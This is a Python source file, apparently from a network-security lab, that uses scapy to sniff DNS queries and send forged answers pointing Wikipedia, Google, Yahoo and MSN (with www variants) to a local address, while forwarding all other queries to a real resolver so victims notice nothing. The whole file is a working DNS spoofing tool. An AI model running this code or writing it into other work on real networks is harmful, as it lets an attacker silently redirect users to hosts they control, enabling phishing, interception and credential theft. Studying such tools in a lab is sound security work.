from scapy.all import *
from scapy.layers.dns import *
from config import MY_IP
from threading import Thread

TEST_MAPPING = {
  "en.wikipedia.org": "192.168.2.2",
  "google.com": "192.168.2.2",
  "translate.google.com": "192.168.2.2",
  "docs.google.com": "192.168.2.2",
  "yahoo.com": "192.168.2.2",
  "msn.com": "192.168.2.2",
}

REACHABLE_DNS_SERVER = '8.26.56.26'

def get_real_dns_response(dns_request: Packet, dns_server: str) -> Packet:
  """
  Given a DNS request packet, send it to an actual DNS server to query 

  Parameters
  -----------
  dns_request: Packet
    DNS request packet
  
  dns_server: str
    A reachable DNS server
  """
  if DNS not in dns_request:
    return None
  
  new_dns_request = (IP(src=MY_IP, dst=REACHABLE_DNS_SERVER) /
                    UDP(sport=dns_request['UDP'].sport, dport=53) /
                    DNS(
                      id=dns_request['DNS'].id,
                      qd=dns_request['DNS'].qd
                    ))
  
  # Forward the packet to specified DNS server
  dns_response = sr1(new_dns_request, timeout=1, verbose=0)
  if dns_response:
    new_dns_response = (IP(src=MY_IP, dst=dns_request['IP'].src) /
                        UDP(sport=53, dport=dns_request['UDP'].sport) /
                        DNS(
                          id=dns_request['DNS'].id,
                          qr=1,
                          ra=1,
                          qd=dns_request['DNS'].qd,
                          an=dns_response['DNSRR'].lastlayer()
                        ))
    return new_dns_response

def is_dns_query(packet: Packet):
  """
  Checks whether the provided packet is a DNS query for IPV4
  """
  return UDP in packet and IP in packet and DNS in packet and packet.qr == 0 and packet['IP'].src != MY_IP

def intercept_dns(intercept_map: dict):
  """
  Intercept DNS requests, given a dict where
  {
    "<Domain name>": <DNS answer IP>,
    ...
  }

  Parameters
  -----------
  intercept_mapping: dict
    Dictionary mapping of domain name to an IP address to answer with
  """
  # Add on records for www. prefix
  intercept_map_modified = {}
  for key in intercept_map.keys():
    intercept_map_modified[f'www.{key}'] = intercept_map[key]

  intercept_map |= intercept_map_modified

  print('Mapping:')
  for [domain_name, answer_ip] in intercept_map.items():
    print(f'{domain_name} -> {answer_ip}')

  def thread_handler(packet: Packet):
    packet.show()
    original_src: str = packet['IP'].src
    original_dst: str = packet['IP'].dst
    dns: DNS = packet['DNS']
    requested_domain: bytes = dns.qd.qname
    # Use processed qname field as key for intercept_map
    requested_domain_str: str = requested_domain.decode('utf8')[:-1]

    # Forward the DNS request to an actual DNS server, then send it back to the requestor
    if requested_domain_str not in intercept_map:
      print(f'Domain {requested_domain_str} not in {str(intercept_map)}')
      dns_response = get_real_dns_response(packet, REACHABLE_DNS_SERVER)
      if dns_response is not None:
        print(f'Answering query for {requested_domain_str} with legitimate IP {dns_response["DNSRR"].rdata}')
      else:
        print(f'Unable to contact DNS server {REACHABLE_DNS_SERVER}')
    else:
      dns_response = (
        IP(src=original_dst, dst=original_src) /
        UDP(sport=53, dport=packet['UDP'].sport) /
        DNS(
          id=dns.id,
          qr=1,
          ra=1,
          qd=dns.qd,
          an=DNSRR(rrname=requested_domain, rdata=intercept_map[requested_domain_str])
        )
      )
      print(f'Answering query for {requested_domain_str} with spoofed IP {intercept_map[requested_domain_str]}')

    if dns_response is not None:
      send(dns_response)
  
  def intercept(packet: Packet):
    Thread(target=thread_handler, args=(packet,)).start()

  # Sniff for DNS packets and answer accordingly
  sniff(prn=intercept, lfilter=is_dns_query)

if __name__ == '__main__':
  intercept_dns(TEST_MAPPING)